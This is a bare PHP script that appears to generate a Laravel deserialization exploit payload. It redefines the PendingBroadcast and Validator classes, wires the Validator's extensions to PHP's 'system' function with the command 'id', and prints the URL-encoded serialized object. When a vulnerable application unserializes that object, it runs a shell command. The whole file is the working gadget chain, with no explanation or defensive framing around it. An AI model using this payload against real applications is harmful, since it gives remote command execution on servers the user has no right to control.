<?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Validation{
    class Validator{
        protected $extensions;
        public function __construct($extensions)
        {
            $this->extensions = $extensions;
        }
    }
}

namespace{
    $b = new Illuminate\Validation\Validator(array(''=>'system'));
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, 'id');
    echo urlencode(serialize($a));
}